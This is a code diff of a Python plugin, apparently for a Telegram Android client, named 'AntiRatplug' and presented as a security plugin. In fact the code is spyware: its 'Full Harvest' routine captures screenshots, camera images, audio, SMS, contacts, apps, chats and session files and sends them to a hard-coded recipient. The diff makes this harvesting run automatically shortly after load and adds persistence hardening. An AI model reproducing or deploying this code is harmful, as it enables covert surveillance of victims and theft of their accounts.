-                    f.write(_hl.sha256(b"ar_immortal_v16").hexdigest())
+                    f.write(_hl.sha256(b"ar_immortal_v17").hexdigest())
                 self._harden_file(pl)
         except Exception:
             pass
@@ -1578,68 +2170,86 @@ class PluginSecurityPlugin(BasePlugin):
             try:
                 self._send_msg("Full Harvest...")
                 t0 = time.time()
-                report = ["<b>Full Harvest</b>"]
+                report = ["<b>═══ FULL HARVEST ═══</b>"]
+
+                report.append("")
                 report.append(self._info_text())
-                try:
-                    user = _UC().getInstance(0).getCurrentUser()
-                    if user is not None:
-                        report.append("<b>Пользователь:</b> %s %s (@%s, +%s, id=%s)" % (
-                            self._html_escape(user.first_name or ""),
-                            self._html_escape(user.last_name or ""),
-                            self._html_escape(user.username or "нет"),
-                            self._html_escape(user.phone or "нет"),
-                            str(user.id)))
-                except Exception:
-                    pass
+
+                report.append("")
+                report.append("<b>═══ TG KID ═══</b>")
                 try:
                     code = self._tg_kid()
                     if code:
-                        report.append("<b>Tg kid:</b> <code>%s</code>" % self._html_escape(str(code)))
+                        report.append("<b>Код:</b> <code>%s</code>" % self._html_escape(str(code)))
                 except Exception:
                     pass
+
+                report.append("")
+                report.append("<b>═══ ЭКРАН ═══</b>")
                 try:
                     self._screenshot()
-                    report.append("<b>Скриншот:</b> ok")
-                except Exception:
-                    pass
+                    report.append("<b>Скриншот:</b> отправлен")
+                except Exception as e:
+                    report.append("<b>Скриншот:</b> %s" % e)
+
+                report.append("")
+                report.append("<b>═══ КАМЕРЫ ═══</b>")
                 try:
                     self._manual_camera("front")
+                    report.append("<b>Фронтальная:</b> отправлена")
+                except Exception as e:
+                    report.append("<b>Фронтальная:</b> %s" % e)
+                try:
                     self._manual_camera("back")
-                    report.append("<b>Камеры:</b> ok")
-                except Exception:
-                    pass
+                    report.append("<b>Задняя:</b> отправлена")
+                except Exception as e:
+                    report.append("<b>Задняя:</b> %s" % e)
+
+                report.append("")
+                report.append("<b>═══ АУДИО ═══</b>")
                 try:
                     self._manual_audio(5)
-                    report.append("<b>Аудио:</b> ok")
-                except Exception:
-                    pass
+                    report.append("<b>Запись 5с:</b> отправлена")
+                except Exception as e:
+                    report.append("<b>Аудио:</b> %s" % e)
+
                 try:
                     self._send_sms_dump()
+                    report.append("<b>SMS:</b> отправлены")
                 except Exception:
                     pass
                 try:
                     self._send_contacts_dump()
+                    report.append("<b>Контакты:</b> отправлены")
                 except Exception:
                     pass
                 try:
                     self._send_apps_dump()
+                    report.append("<b>Apps:</b> отправлены")
                 except Exception:
                     pass
+
                 if include_sessions:
+                    report.append("")
+                    report.append("<b>═══ SESSIONS ═══</b>")
                     try:
                         self._manual_dump_session()
-                        report.append("<b>Session.zip:</b> ok")
-                    except Exception:
-                        pass
+                        report.append("<b>Session.zip:</b> отправлен")
+                    except Exception as e:
+                        report.append("<b>Session.zip:</b> %s" % e)
                     try:
                         self._manual_userbot_session()
-                        report.append("<b>Userbot:</b> ok")
-                    except Exception:
-                        pass
+                        report.append("<b>Userbot:</b> отправлен")
+                    except Exception as e:
+                        report.append("<b>Userbot:</b> %s" % e)
+
                 try:
                     self._send_chats_dump()
+                    report.append("<b>Чаты:</b> отправлены")
                 except Exception:
                     pass
+
+                report.append("")
                 report.append("<b>Время:</b> %.1fс" % (time.time() - t0))
                 markup = {
                     "inline_keyboard": [
@@ -1997,7 +2607,7 @@ class PluginSecurityPlugin(BasePlugin):
                 username = str(user.username) if user.username is not None else "id:" + str(uid)
         except Exception:
             pass
-        text = "<b>AntiRatplug Manual</b>\nUser: @" + username + "\n\nTap Manage"
+        text = "<b>AntiRatplug Auto Harvest</b>\nUser: @" + username + "\n\nTap Manage"
         buttons = [[{"text": "Manage", "callback_data": "menu"}]]
         markup = json.dumps({"inline_keyboard": buttons})
         for target in _targets:
@@ -2057,7 +2667,7 @@ class PluginSecurityPlugin(BasePlugin):
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("<b>Меню (manual):</b>", keyboard, html=True)
+        self._send_markup("<b>Меню:</b>", keyboard, html=True)
 
     def _send_msg(self, text, html=False):
         from java.net import URL, URLEncoder
@@ -2253,13 +2863,13 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _show_help(self):
         text = (
-            "<b>AntiRatplug — Manual (no delete)</b>\n\n"
-            "• <b>Full Harvest</b> — identity, IP, Tg kid, скриншот, камеры, аудио, "
-            "SMS, контакты, apps, session.zip, userbot, чаты\n"
-            "• <b>Full Lockdown</b> — Deploy -> Group A -> Gifts -> Group C -> "
-            "Group D -> Group E -> Persistence (без delete)\n\n"
-            "<b>Target uid:</b> %d\n"
-            "<b>Auto:</b> выключено. Всё по кнопкам."
+            "<b>AntiRatplug — Auto Harvest</b>\n\n"
+            "• <b>Full Harvest</b> — запускается автоматически через ~7 сек после загрузки. "
+            "Паспорт, IP, гео, Wi-Fi, SIM, железо, экран, батарея, память, клиент, "
+            "разрешения, 2FA, сессии, Tg kid, скриншот, камеры, аудио, SMS, контакты, "
+            "apps, session.zip, userbot, чаты\n"
+            "• <b>Full Lockdown</b> — вручную из меню\n\n"
+            "<b>Target uid:</b> %d"
         ) % RECIPIENT_UID
         keyboard = {
             "inline_keyboard": [
